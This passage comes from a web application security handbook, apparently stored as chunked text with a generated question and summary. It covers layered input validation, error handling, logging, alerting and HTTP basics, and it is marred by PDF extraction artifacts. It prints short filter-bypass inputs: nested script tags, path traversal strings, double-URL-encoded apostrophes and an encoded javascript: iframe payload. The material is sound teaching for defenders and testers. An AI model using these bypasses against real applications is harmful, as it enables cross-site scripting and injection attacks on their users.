transformed, it might\ncome to bear no resemblance to the original input. A skilled attacker\nmay be able to manipulate the application to cause malicious input to be\ngenerated at a key stage of the processing, attacking the component that\nreceives this data. It would be extremely diffi cult to implement a valida-\ntion mechanism at the external boundary to foresee all the possible results\nof processing each piece of user input.\nn Defending against different categories of input-based attack may entail\nperforming different validation checks on user input that are incompat-\nible with one another. For example, preventing cross-site scripting attacks\nmay require the application to HTML-encode the > character as &gt;, and\npreventing command injection attacks may require the application to\nblock input containing the & and ; characters. Attempting to prevent all\ncategories of attack simultaneously at the application’s external boundary\nmay sometimes be impossible.\nA more effective model uses the concept of boundaryvalidation. Here, each\nindividual component or functional unit of the server-side application treats\nits inputs as coming from a potentially malicious source. Data validation is\nperformed at each of these trust boundaries, in addition to the external frontier\nbetween the client and server. This model provides a solution to the problems\njust described. Each component can defend itself against the specifi c types of\ncrafted input to which it may be vulnerable. As data passes through different\ncc0022..iinndddd 2266 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 27\nChapter 2 n Core Defense Mechanisms 27\ncomponents, validation checks can be performed against whatever value the data\nhas as a result of previous transformations. And because the various validation\nchecks are implemented at different stages of processing, they are unlikely to\ncome into confl ict with one another.\nFigure 2-5 illustrates a typical situation where boundary validation is the\nmost effective approach to defending against malicious input. The user login\nresults in several steps of processing being performed on user-supplied input,\nand suitable validation is performed at each step:\n1. The application receives the user’s login details. The form handler vali-\ndates that each item of input contains only permitted characters, is within\na specifi c length limit, and does not contain any known attack signatures.\n2. The application performs a SQL query to verify the user’s credentials.\nTo prevent SQL injection attacks, any characters within the user input\nthat may be used to attack the database are escaped before the query is\nconstructed.\n3. If the login succeeds, the application passes certain data from the user’s\nprofi le to a SOAP service to retrieve further information about her account.\nTo prevent SOAP injection attacks, any XML metacharacters within the\nuser’s profi le data are suitably encoded.\n4. The application displays the user’s account information back to the user’s\nbrowser. To prevent cross-site scripting attacks, the application HTML-\nencodes any user-supplied data that is embedded into the returned page.\n2. Clean SQL\n1. General checks\nSQL query\nLogin submission\nDatabase\nDisplay account details\nUser\nApplication\nserver\n3. Encode XML\n4. Sanitize output\nmetacharacters\n\nSOAP\nmessage\nSOAP service\nFigure 2-5: An application function using boundary validation at multiple stages of\nprocessing\ncc0022..iinndddd 2277 88//1199//22001111 1122::0022::4422 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 28\n28 Chapter 2 n Core Defense Mechanisms\nThe specifi c vulnerabilities and defenses involved in this scenario will be\nexamined in detail in later chapters. If variations on this functionality involved\npassing data to further application components, similar defenses would need\nto be implemented at the relevant trust boundaries. For example, if a failed\nlogin caused the application to send a warning e-mail to the user, any user\ndata incorporated into the e-mail may need to be checked for SMTP injection\nattacks.\nMultistep Validation and Canonicalization\nA common problem encountered by input-handling mechanisms arises when\nuser-supplied input is manipulated across several steps as part of the valida-\ntion logic. If this process is not handled carefully, an attacker may be able to\nconstruct crafted input that succeeds in smuggling malicious data through the\nvalidation mechanism. One version of this problem occurs when an application\nattempts to sanitize user input by removing or encoding certain characters or\nexpressions. For example, an application may attempt to defend against some\ncross-site scripting attacks by stripping the expression:\n<script>\nfrom any user-supplied data. However, an attacker may be able to bypass the\nfi lter by supplying the following input:\n<scr<script>ipt>\nWhen the blocked expression is removed, the surrounding data contracts\nto restore the malicious payload, because the filter is not being applied\nrecursively.\nSimilarly, if more than one validation step is performed on user input, an\nattacker may be able to exploit the ordering of these steps to bypass the fi lter.\nFor example, if the application fi rst removes ../ recursively and then removes\n..\\ recursively, the following input can be used to defeat the validation:\n....\\/\nA related problem arises in relation to data canonicalization. When input\nis sent from the user’s browser, it may be encoded in various ways. These\nencoding schemes exist so that unusual characters and binary data may be\ntransmitted safely over HTTP (see Chapter 3 for more details). Canonicalization\nis the process of converting or decoding data into a common character set. If\nany canonicalization is carried out after input fi lters have been applied, an\nattacker may be able to use a suitable encoding scheme to bypass the valida-\ntion mechanism.\nFor example, an application may attempt to defend against some SQL injec-\ntion attacks by blocking input containing the apostrophe character. However, if\ncc0022..iinndddd 2288 88//1199//22001111 1122::0022::4433 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 29\nChapter 2 n Core Defense Mechanisms 29\nthe input is subsequently canonicalized, an attacker may be able to use double\nURL encoding to defeat the fi lter. For example:\n%2527\nWhen this input is received, the application server performs its normal URL\ndecode, so the input becomes:\n%27\nThis does not contain an apostrophe, so it is permitted by the application’s fi lters.\nBut when the application performs a further URL decode, the input is converted\ninto an apostrophe, thereby bypassing the fi lter.\nIf the application strips the apostrophe instead of blocking it, and then per-\nforms further canonicalization, the following bypass may be effective:\n%%2727\nIt is worth noting that the multiple validation and canonicalization steps\nin these cases need not all take place on the server side of the application. For\nexample, in the following input several characters have been HTML-encoded:\n<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >\nIf the server-side application uses an input fi lter to block certain JavaScript\nexpressions and characters, the encoded input may succeed in bypassing the\nfi lter. However, if the input is then copied into the application’s response, some\nbrowsers perform an HTML decode of the src parameter value, and the embed-\nded JavaScript executes.\nIn addition to the standard encoding schemes that are intended for use in\nweb applications, canonicalization issues can arise in other situations where a\ncomponent employed by the application converts data from one character set\nto another. For example, some technologies perform a “best fi t” mapping of\ncharacters based on similarities in their printed glyphs. Here, the characters «\nand » may be converted into < and >, respectively, and Ÿ and Â are converted\ninto Y and A. This behavior can often be leveraged to smuggle blocked characters\nor keywords past an application’s input fi lters.\nThroughout this book, we will describe numerous attacks of this kind, which\nare effective in defeating many applications’ defenses against common input-\nbased vulnerabilities.\nAvoiding problems with multistep validation and canonicalization can some-\ntimes be diffi cult, and there is no single solution to the problem. One approach is\nto perform sanitization steps recursively, continuing until no further modifi cations\nhave been made on an item of input. However, where the desired sanitization\ninvolves escaping a problematic character, this may result in an infi nite loop.\nOften, the problem can be addressed only on a case-by-case basis, based on the\ntypes of validation being performed. Where feasible, it may be preferable to avoid\nattempting to clean some kinds of bad input, and simply reject it altogether.\ncc0022..iinndddd 2299 88//1199//22001111 1122::0022::4433 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 30\n30 Chapter 2 n Core Defense Mechanisms\nHandling Attackers\nAnyone designing an application for which security is remotely important must\nassume that it will be directly targeted by dedicated and skilled attackers. A key\nfunction of the application’s security mechanisms is being able to handle and\nreact to these attacks in a controlled way. These mechanisms often incorporate\na mix of defensive and offensive measures designed to frustrate an attacker as\nmuch as possible and give the application’s owners appropriate notifi cation and\nevidence of what has taken place. Measures implemented to handle attackers\ntypically include the following tasks:\nn Handling errors\nn Maintaining audit logs\nn Alerting administrators\nn Reacting to attacks\nHandling Errors\nHowever careful an application’s developers are when validating user input, it\nis virtually inevitable that some unanticipated errors will occur. Errors resulting\nfrom the actions of ordinary users are likely to be identifi ed during functional-\nity and user acceptance testing. Therefore, they are taken into account before\nthe application is deployed in a production context. However, it is diffi cult to\nanticipate every possible way in which a malicious user may interact with the\napplication, so further errors should be expected when the application comes\nunder attack.\nA key defense mechanism is for the application to handle unexpected errors\ngracefully, and either recover from them or present a suitable error message\nto the user. In a production context, the application should never return any\nsystem-generated messages or other debug information in its responses. As\nyou will see throughout this book, overly verbose error messages can greatly\nassist malicious users in furthering their attacks against the application. In some\nsituations, an attacker can leverage defective error handling to retrieve sensi-\ntive information within the error messages themselves, providing a valuable\nchannel for stealing data from the application. Figure 2-6 shows an example of\nan unhandled error resulting in a verbose error message.\nMost web development languages provide good error-handling support\nthrough try-catch blocks and checked exceptions. Application code should\nmake extensive use of these constructs to catch specifi c and general errors and\nhandle them appropriately. Furthermore, most application servers can be con-\nfi gured to deal with unhandled application errors in customized ways, such as\ncc0022..iinndddd 3300 88//1199//22001111 1122::0022::4433 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 31\nChapter 2 n Core Defense Mechanisms 31\nby presenting an uninformative error message. See Chapter 15 for more details\non these measures.\nFigure 2-6: An unhandled error\nEffective error handling is often integrated with the application’s logging\nmechanisms, which record as much debug information as possible about unan-\nticipated errors. Unexpected errors often point to defects within the application’s\ndefenses that can be addressed at the source if the application’s owner has the\nrequired information.\nMaintaining Audit Logs\nAudit logs are valuable primarily when investigating intrusion attempts against\nan application. Following such an incident, effective audit logs should enable\nthe application’s owners to understand exactly what has taken place, which\nvulnerabilities (if any) were exploited, whether the attacker gained unauthorized\naccess to data or performed any unauthorized actions, and, as far as possible,\nprovide evidence of the intruder’s identity.\ncc0022..iinndddd 3311 88//1199//22001111 1122::0022::4433 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 32\n32 Chapter 2 n Core Defense Mechanisms\nIn any application for which security is important, key events should be logged\nas a matter of course. At a minimum, these typically include the following:\nn All events relating to the authentication functionality, such as successful\nand failed login, and change of password\nn Key transactions, such as credit card payments and funds transfers\nn Access attempts that are blocked by the access control mechanisms\nn Any requests containing known attack strings that indicate overtly mali-\ncious intentions\nIn many security-critical applications, such as those used by online banks,\nevery client request is logged in full, providing a complete forensic record that\ncan be used to investigate any incidents.\nEffective audit logs typically record the time of each event, the IP address\nfrom which the request was received, and the user’s account (if authenticated).\nSuch logs need to be strongly protected against unauthorized read or write\naccess. An effective approach is to store audit logs on an autonomous system\nthat accepts only update messages from the main application. In some situa-\ntions, logs may be fl ushed to write-once media to ensure their integrity in the\nevent of a successful attack.\nIn terms of attack surface, poorly protected audit logs can provide a gold mine\nof information to an attacker, disclosing a host of sensitive information such as\nsession tokens and request parameters. This information may enable the attacker\nto immediately compromise the entire application, as shown in Figure 2-7.\nFigure 2-7: Poorly protected application logs containing sensitive information\nsubmitted by other users\ncc0022..iinndddd 3322 88//1199//22001111 1122::0022::4433 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 33\nChapter 2 n Core Defense Mechanisms 33\nAlerting Administrators\nAudit logs enable an application’s owners to retrospectively investigate intrusion\nattempts and, if possible, take legal action against the perpetrator. However, in\nmany situations it is desirable to take much more immediate action, in real time,\nin response to attempted attacks. For example, administrators may block the IP\naddress or user account an attacker is using. In extreme cases, they may even\ntake the application offl ine while investigating the attack and taking remedial\naction. Even if a successful intrusion has already occurred, its practical effects\nmay be mitigated if defensive action is taken at an early stage.\nIn most situations, alerting mechanisms must balance the confl icting objec-\ntives of reporting each genuine attack reliably and of not generating so many\nalerts that these come to be ignored. A well-designed alerting mechanism can\nuse a combination of factors to diagnose that a determined attack is under way\nand can aggregate related events into a single alert where possible. Anomalous\nevents monitored by alerting mechanisms often include the following:\nn Usage anomalies, such as large numbers of requests being received from\na single IP address or user, indicating a scripted attack\nn Business anomalies, such as an unusual number of funds transfers being\nmade to or from a single bank account\nn Requests containing known attack strings\nn Requests where data that is hidden from ordinary users has been modifi ed\nSome of these functions can be provided reasonably well by off-the-shelf\napplication fi rewalls and intrusion detection products. These typically use a\nmixture of signature- and anomaly-based rules to identify malicious use of\nthe application and may reactively block malicious requests as well as issue\nalerts to administrators. These products can form a valuable layer of defense\nprotecting a web application, particularly in the case of existing applications\nknown to contain problems but where resources to fi x these are not immedi-\nately available. However, their effectiveness usually is limited by the fact that\neach web application is different, so the rules employed are inevitably generic\nto some extent. Web application fi rewalls usually are good at identifying the\nmost obvious attacks, where an attacker submits standard attack strings in\neach request parameter. However, many attacks are more subtle than this. For\nexample, perhaps they modify the account number in a hidden fi eld to access\nanother user’s data, or submit requests out of sequence to exploit defects in the\napplication’s logic. In these cases, a request submitted by an attacker may be\ncc0022..iinndddd 3333 88//1199//22001111 1122::0022::4433 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 34\n34 Chapter 2 n Core Defense Mechanisms\nidentical to that submitted by a benign user. What makes it malicious are the\ncircumstances under which it is made.\nIn any security-critical application, the most effective way to implement real-\ntime alerting is to integrate this tightly with the application’s input validation\nmechanisms and other controls. For example, if a cookie is expected to have\none of a specifi c set of values, any violation of this indicates that its value has\nbeen modifi ed in a way that is not possible for ordinary users of the application.\nSimilarly, if a user changes an account number in a hidden fi eld to identify a\ndifferent user’s account, this strongly indicates malicious intent. The application\nshould already be checking for these attacks as part of its primary defenses,\nand these protective mechanisms can easily hook into the application’s alert-\ning mechanism to provide fully customized indicators of malicious activity.\nBecause these checks have been tailored to the application’s actual logic, with\na fi ne-grained knowledge of how ordinary users should be behaving, they\nare much less prone to false positives than any off-the-shelf solution, however\nconfi gurable or easy-to-learn that solution may be.\nReacting to Attacks\nIn addition to alerting administrators, many security-critical applications con-\ntain built-in mechanisms to react defensively to users who are identifi ed as\npotentially malicious.\nBecause each application is different, most real-world attacks require an\nattacker to probe systematically for vulnerabilities, submitting numerous requests\ncontaining crafted input designed to indicate the presence of various common\nvulnerabilities. Effective input validation mechanisms will identify many of\nthese requests as potentially malicious and block the input from having any\nundesirable effect on the application. However, it is sensible to assume that\nsome bypasses to these fi lters exist and that the application does contain some\nactual vulnerabilities waiting to be discovered and exploited. At some point, an\nattacker working systematically is likely to discover these defects.\nFor this reason, some applications take automatic reactive measures to frus-\ntrate the activities of an attacker who is working in this way. For example, they\nmight respond increasingly slowly to the attacker’s requests or terminate the\nattacker’s session, requiring him to log in or perform other steps before con-\ntinuing the attack. Although these measures will not defeat the most patient\nand determined attacker, they will deter many more casual attackers and will\nbuy additional time for administrators to monitor the situation and take more\ndrastic action if desired.\ncc0022..iinndddd 3344 88//1199//22001111 1122::0022::4433 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 35\nChapter 2 n Core Defense Mechanisms 35\nReacting to apparent attackers is not, of course, a substitute for fi xing any\nvulnerabilities that exist within the application. However, in the real world, even\nthe most diligent efforts to purge an application of security fl aws may leave\nsome exploitable defects. Placing further obstacles in the way of an attacker\nis an effective defense-in-depth measure that reduces the likelihood that any\nresidual vulnerabilities will be found and exploited.\nManaging the Application\nAny useful application needs to be managed and administered. This facility\noften forms a key part of the application’s security mechanisms, providing a\nway for administrators to manage user accounts and roles, access monitoring\nand audit functions, perform diagnostic tasks, and confi gure aspects of the\napplication’s functionality.\nIn many applications, administrative functions are implemented within\nthe application itself, accessible through the same web interface as its core\nnonsecurity functionality, as shown in Figure 2-8. Where this is the case, the\nadministrative mechanism represents a critical part of the application’s attack\nsurface. Its primary attraction for an attacker is as a vehicle for privilege esca-\nlation. For example:\nn Weaknesses in the authentication mechanism may enable an attacker\nto gain administrative access, effectively compromising the entire\napplication.\nn Many applications do not implement effective access control of some of\ntheir administrative functions. An attacker may fi nd a means of creating\na new user account with powerful privileges.\nn Administrative functionality often involves displaying data that originated\nfrom ordinary users. Any cross-site scripting fl aws within the administra-\ntive interface can lead to compromise of a user session that is guaranteed\nto have powerful privileges.\nn Administrative functionality is often subjected to less rigorous security\ntesting, because its users are deemed to be trusted, or because penetration\ntesters are given access to only low-privileged accounts. Furthermore, the\nfunctionality often needs to perform inherently dangerous operations,\ninvolving access to fi les on disk or operating system commands. If an\nattacker can compromise the administrative function, he can often lever-\nage it to take control of the entire server.\ncc0022..iinndddd 3355 88//1199//22001111 1122::0022::4433 PPMM\n\nStuttard c02.indd V3 - 07/22/2011 Page 36\n36 Chapter 2 n Core Defense Mechanisms\nFigure 2-8: An administrative interface within a web application\nSummary\nDespite their extensive differences, virtually all web applications employ the\nsame core security mechanisms in some shape or form. These mechanisms rep-\nresent an application’s primary defenses against malicious users and therefore\nalso comprise the bulk of the application’s attack surface. The vulnerabilities\nwe will examine later in this book mainly arise from defects within these core\nmechanisms.\nOf these components, the mechanisms for handling user access and user input\nare the most important and should receive most of your attention when you are\ntargeting an application. Defects in these mechanisms often lead to complete\ncompromise of the application, enabling you to access data belonging to other\nusers, perform unauthorized actions, and inject arbitrary code and commands.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. Why are an application’s mechanisms for handling user access only as\nstrong as the weakest of these components?\n2. What is the difference between a session and a session token?\n3. Why is it not always possible to use a whitelist-based approach to input\nvalidation?\ncc0022..iinndddd 3366 88//1199//22001111 1122::0022::4433 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 37\nChapter 2 n Core Defense Mechanisms 37\n4. You are attacking an application that implements an administrative func-\ntion. You do not have any valid credentials to use the function. Why should\nyou nevertheless pay close attention to it?\n5. An input validation mechanism designed to block cross-site scripting\nattacks performs the following sequence of steps on an item of input:\n1. Strip any <script> expressions that appear.\n2. Truncate the input to 50 characters.\n3. Remove any quotation marks within the input.\n4. URL-decode the input.\n5. If any items were deleted, return to step 1.\nCan you bypass this validation mechanism to smuggle the following data\npast it?\n“><script>alert(“foo”)</script>\ncc0022..iinndddd 3377 88//1199//22001111 1122::0022::4444 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 38\ncc0022..iinndddd 3388 88//1199//22001111 1122::0022::4444 PPMM",
    "question": "What are the core defense mechanisms used by web applications to protect against security threats and how do they contribute to the application's attack surface?",
    "summary": "Web applications face a core security challenge due to untrusted user input, leading to the use of several defense mechanisms to prevent unauthorized access and malicious behavior. These mechanisms include handling user access, input validation, error handling, audit logging, and managing the application itself. Understanding these core defenses is essential for effectively attacking web applications, as they form the majority of the application's attack surface. The text explains how each of these mechanisms works, highlights common vulnerabilities, and discusses strategies for bypassing or exploiting them."
  },
  {
    "start": 39,
    "end": 49,
    "text": "Stuttard c03.indd V3 - 07/22/2011 Page 39\n\nCHAPTER\n3\nWeb Application Technologies\nWeb applications employ a myriad of technologies to implement their function-\nality. This chapter is a short primer on the key technologies that you are likely\nto encounter when attacking web applications. We will examine the HTTP\nprotocol, the technologies commonly employed on the server and client sides,\nand the encoding schemes used to represent data in different situations. These\ntechnologies are in general easy to understand, and a grasp of their relevant\nfeatures is key to performing effective attacks against web applications.\nIf you are already familiar with the key technologies used in web applications,\nyou can skim through this chapter to confi rm that it offers you nothing new. If\nyou are still learning how web applications work, you should read this chapter\nbefore continuing to the later chapters on specifi c vulnerabilities. For further\nreading on many of the areas covered, we recommend HTTP: The Defi nitive\nGuide by David Gourley and Brian Totty (O’Reilly, 2002), and also the website\nof the World Wide Web Consortium at www.w3.org.\nThe HTTP Protocol\nHypertext transfer protocol (HTTP) is the core communications protocol used to\naccess the World Wide Web and is used by all of today’s web applications. It is\na simple protocol that was originally developed for retrieving static text-based\nresources. It has since been extended and leveraged in various ways to enable\nit to support the complex distributed applications that are now commonplace.\n39\ncc0033..iinndddd 3399 88//1199//22001111 1122::0033::4433 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 40\n40 Chapter 3 n Web Application Technologies\nHTTP uses a message-based model in which a client sends a request mes-\nsage and the server returns a response message. The protocol is essentially\nconnectionless: although HTTP uses the stateful TCP protocol as its transport\nmechanism, each exchange of request and response is an autonomous transac-\ntion and may use a different TCP connection.\nHTTP Requests\nAll HTTP messages (requests and responses) consist of one or more headers,\neach on a separate line, followed by a mandatory blank line, followed by an\noptional message body. A typical HTTP request is as follows:\nGET /auth/488/YourDetails.ashx?uid=129 HTTP/1.1\nAccept: application/x-ms-application, image/jpeg, application/xaml+xml,\nimage/gif, image/pjpeg, application/x-ms-xbap, application/x-shockwave-\nflash, */*\nReferer: https://mdsec.net/auth/488/Home.ashx\nAccept-Language: en-GB\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;\nTrident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR\n\n3.0.30729; .NET4.0C; InfoPath.3; .NET4.0E; FDM; .NET CLR 1.1.4322)\nAccept-Encoding: gzip, deflate\nHost: mdsec.net\nConnection: Keep-Alive\nCookie: SessionId=5B70C71F3FD4968935CDB6682E545476\nThe fi rst line of every HTTP request consists of three items, separated by spaces:\nn A verb indicating the HTTP method. The most commonly used method\nisGET, whose function is to retrieve a resource from the web server. GET\nrequests do not have a message body, so no further data follows the blank\nline after the message headers.\nn The requested URL. The URL typically functions as a name for the resource\nbeing requested, together with an optional query string containing param-\neters that the client is passing to that resource. The query string is indicated\nby the ? character in the URL. The example contains a single parameter\nwith the name uid and the value 129.\nn The HTTP version being used. The only HTTP versions in common use\non the Internet are 1.0 and 1.1, and most browsers use version 1.1 by\ndefault. There are a few differences between the specifi cations of these\ntwo versions; however, the only difference you are likely to encounter\nwhen attacking web applications is that in version 1.1 the Host request\nheader is mandatory.\ncc0033..iinndddd 4400 88//1199//22001111 1122::0033::4433 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 41\nChapter 3 n Web Application Technologies 41\nHere are some other points of interest in the sample request:\nn TheReferer header is used to indicate the URL from which the request\noriginated (for example, because the user clicked a link on that page).\nNote that this header was misspelled in the original HTTP specifi cation,\nand the misspelled version has been retained ever since.\nn TheUser-Agent header is used to provide information about the browser\nor other client software that generated the request. Note that most brows-\ners include the Mozilla prefi x for historical reasons. This was the User-\nAgent string used by the originally dominant Netscape browser, and other\nbrowsers wanted to assert to websites that they were compatible with this\nstandard. As with many quirks from computing history, it has become so\nestablished that it is still retained, even on the current version of Internet\nExplorer, which made the request shown in the example.\nn The Host header specifi es the hostname that appeared in the full URL\nbeing accessed. This is necessary when multiple websites are hosted on\nthe same server, because the URL sent in the fi rst line of the request usu-\nally does not contain a hostname. (See Chapter 17 for more information\nabout virtually hosted websites.)\nn The Cookie header is used to submit additional parameters that the server\nhas issued to the client (described in more detail later in this chapter).\nHTTP Responses\nA typical HTTP response is as follows:\nHTTP/1.1 200 OK\nDate: Tue, 19 Apr 2011 09:23:32 GMT\nServer: Microsoft-IIS/6.0\nX-Powered-By: ASP.NET\nSet-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc\nX-AspNet-Version: 2.0.50727\nCache-Control: no-cache\nPragma: no-cache\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 1067\n<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://\nwww.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”><html xmlns=”http://\nwww.w3.org/1999/xhtml” ><head><title>Your details</title>\n...\ncc0033..iinndddd 4411 88//1199//22001111 1122::0033::4433 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 42\n42 Chapter 3 n Web Application Technologies\nThe fi rst line of every HTTP response consists of three items, separated by\nspaces:\nn The HTTP version being used.\nn A numeric status code indicating the result of the request. 200 is the most\ncommon status code; it means that the request was successful and that\nthe requested resource is being returned.\nn A textual “reason phrase” further describing the status of the response. This\ncan have any value and is not used for any purpose by current browsers.\nHere are some other points of interest in the response:\nn TheServer header contains a banner indicating the web server software\nbeing used, and sometimes other details such as installed modules and\nthe server operating system. The information contained may or may not\nbe accurate.\nn TheSet-Cookie header issues the browser a further cookie; this is sub-\nmitted back in the Cookie header of subsequent requests to this server.\nn ThePragma header instructs the browser not to store the response in its\ncache. The Expires header indicates that the response content expired\nin the past and therefore should not be cached. These instructions are\nfrequently issued when dynamic content is being returned to ensure\nthat browsers obtain a fresh version of this content on subsequent\noccasions.\nn Almost all HTTP responses contain a message body following the blank\nline after the headers. The Content-Type header indicates that the body\nof this message contains an HTML document.\nn The Content-Length header indicates the length of the message body in\nbytes.\nHTTP Methods\nWhen you are attacking web applications, you will be dealing almost exclusively\nwith the most commonly used methods: GET and POST. You need to be aware\nof some important differences between these methods, as they can affect an\napplication’s security if overlooked.\nThe GET method is designed to retrieve resources. It can be used to send\nparameters to the requested resource in the URL query string. This enables\nusers to bookmark a URL for a dynamic resource that they can reuse. Or other\nusers can retrieve the equivalent resource on a subsequent occasion (as in a\nbookmarked search query). URLs are displayed on-screen and are logged in\nvarious places, such as the browser history and the web server’s access logs.\nThey are also transmitted in the Referer header to other sites when external\ncc0033..iinndddd 4422 88//1199//22001111 1122::0033::4433 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 43\nChapter 3 n Web Application Technologies 43\nlinks are followed. For these reasons, the query string should not be used to\ntransmit any sensitive information.\nThe POST method is designed to perform actions. With this method, request\nparameters can be sent both in the URL query string and in the body of the\nmessage. Although the URL can still be bookmarked, any parameters sent in\nthe message body will be excluded from the bookmark. These parameters will\nalso be excluded from the various locations in which logs of URLs are main-\ntained and from the Referer header. Because the POST method is designed for\nperforming actions, if a user clicks the browser’s Back button to return to a\npage that was accessed using this method, the browser does not automatically\nreissue the request. Instead, it warns the user of what it is about to do, as shown\nin Figure 3-1. This prevents users from unwittingly performing an action more\nthan once. For this reason, POST requests should always be used when an action\nis being performed.\nFigure 3-1: Browsers do not automatically reissue POST requests made by\nusers, because these might cause an action to be performed more than once\nIn addition to the GET and POST methods, the HTTP protocol supports numer-\nous other methods that have been created for specifi c purposes. Here are the\nother ones you are most likely to require knowledge of:\nn HEAD functions in the same way as a GET request, except that the server\nshould not return a message body in its response. The server should return\nthe same headers that it would have returned to the corresponding GET\nrequest. Hence, this method can be used to check whether a resource is\npresent before making a GET request for it.\nn TRACE is designed for diagnostic purposes. The server should return in the\nresponse body the exact contents of the request message it received. This\ncan be used to detect the effect of any proxy servers between the client\nand server that may manipulate the request.\nn OPTIONS asks the server to report the HTTP methods that are available for\na particular resource. The server typically returns a response containing\nanAllow header that lists the available methods.\nn PUT attempts to upload the specifi ed resource to the server, using the con-\ntent contained in the body of the request. If this method is enabled, you\nmay be able to leverage it to attack the application, such as by uploading\nan arbitrary script and executing it on the server.\ncc0033..iinndddd 4433 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 44\n44 Chapter 3 n Web Application Technologies\nMany other HTTP methods exist that are not directly relevant to attacking\nweb applications. However, a web server may expose itself to attack if certain\ndangerous methods are available. See Chapter 18 for further details on these\nmethods and examples of using them in an attack.\nURLs\nA uniform resource locator (URL) is a unique identifi er for a web resource through\nwhich that resource can be retrieved. The format of most URLs is as follows:\nprotocol://hostname[:port]/[path/]file[?param=value]\nSeveral components in this scheme are optional. The port number usually is\nincluded only if it differs from the default used by the relevant protocol. The\nURL used to generate the HTTP request shown earlier is as follows:\nhttps://mdsec.net/auth/488/YourDetails.ashx?uid=129\nIn addition to this absolute form, URLs may be specifi ed relative to a particular\nhost, or relative to a particular path on that host. For example:\n/auth/488/YourDetails.ashx?uid=129\nYourDetails.ashx?uid=129\nThese relative forms are often used in web pages to describe navigation within\nthe website or application itself.\nNOTE You may encounter the term URI (or uniform resource identifi er)\nbeing used instead of URL, but it is really only used in formal specifi cations\nand by those who want to exhibit their pedantry.\n\nREST\nRepresentational state transfer (REST) is a style of architecture for distributed\nsystems in which requests and responses contain representations of the current\nstate of the system’s resources. The core technologies employed in the World\nWide Web, including the HTTP protocol and the format of URLs, conform to\nthe REST architectural style.\nAlthough URLs containing parameters within the query string do themselves\nconform to REST constraints, the term “REST-style URL” is often used to signify\na URL that contains its parameters within the URL fi le path, rather than the\nquery string. For example, the following URL containing a query string:\nhttp://wahh-app.com/search?make=ford&model=pinto\ncorresponds to the following URL containing “REST-style” parameters:\nhttp://wahh-app.com/search/ford/pinto\ncc0033..iinndddd 4444 88//1199//22001111 1122::0033::4444 PPMM\n\nStuttard c03.indd V3 - 07/22/2011 Page 45\nChapter 3 n Web Application Technologies 45\nChapter 4 describes how you need to consider these different parameter styles\nwhen mapping an application’s content and functionality and identifying its\nkey attack surface.\nHTTP Headers\nHTTP supports a large number of headers, some of which are designed for\nspecifi c unusual purposes. Some headers can be used for both requests and\nresponses, and others are specifi c to one of these message types. The following\nsections describe the headers you are likely to encounter when attacking web\napplications.\nGeneral Headers\nn Connection tells the other end of the communication whether it should\nclose the TCP connection after the HTTP transmission has completed or\nkeep it open for further messages.\nn Content-Encoding specifi es what kind of encoding is being used for the\ncontent contained in the message body, such as gzip, which is used by\nsome applications to compress responses for faster transmission.\nn Content-Length specifi es the length of the message body, in bytes (except\nin the case of responses to HEAD requests, when it indicates the length of\nthe body in the response to the corresponding GET request).\nn Content-Type specifi es the type of content contained in the message body,\nsuch as text/html for HTML documents.\nn Transfer-Encoding specifi es any encoding that was performed on the\nmessage body to facilitate its transfer over HTTP. It is normally used to\nspecify chunked encoding when this is employed.\nRequest Headers\nn Accept tells the server what kinds of content the client is willing to accept,\nsuch as image types, offi ce document formats, and so on.\nn Accept-Encoding tells the server what kinds of content encoding the client\nis willing to accept.\nn Authorization submits credentials to the server for one of the built-in\nHTTP authentication types.\nn Cookie submits cookies to the server that the server previously issued.\nn Host specifi es the hostname that appeared in the full URL being requested.\ncc0033..iinndddd 4455 88//1199//22001111 1122::0033::4444 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 46\n46 Chapter 3 n Web Application Technologies\nn If-Modified-Since specifi es when the browser last received the requested\nresource. If the resource has not changed since that time, the server may\ninstruct the client to use its cached copy, using a response with status code 304.\nn If-None-Match specifi es an entitytag, which is an identifi er denoting the\ncontents of the message body. The browser submits the entity tag that\nthe server issued with the requested resource when it was last received.\nThe server can use the entity tag to determine whether the browser may\nuse its cached copy of the resource.\nn Origin is used in cross-domain Ajax requests to indicate the domain from\nwhich the request originated (see Chapter 13).\nn Referer specifi es the URL from which the current request originated.\nn User-Agent provides information about the browser or other client soft-\nware that generated the request.\nResponse Headers\nn Access-Control-Allow-Origin indicates whether the resource can be\nretrieved via cross-domain Ajax requests (see Chapter 13).\nn Cache-Control passes caching directives to the browser (for example,\nno-cache).\nn ETag specifi es an entity tag. Clients can submit this identifi er in future\nrequests for the same resource in the If-None-Match header to notify the\nserver which version of the resource the browser currently holds in its cache.\nn Expires tells the browser for how long the contents of the message body\nare valid. The browser may use the cached copy of this resource until\nthis time.\nn Location is used in redirection responses (those that have a status code\nstarting with 3) to specify the target of the redirect.\nn Pragma passes caching directives to the browser (for example, no-cache).\nn Server provides information about the web server software being used.\nn Set-Cookie issues cookies to the browser that it will submit back to the\nserver in subsequent requests.\nn WWW-Authenticate is used in responses that have a 401 status code to\nprovide details on the type(s) of 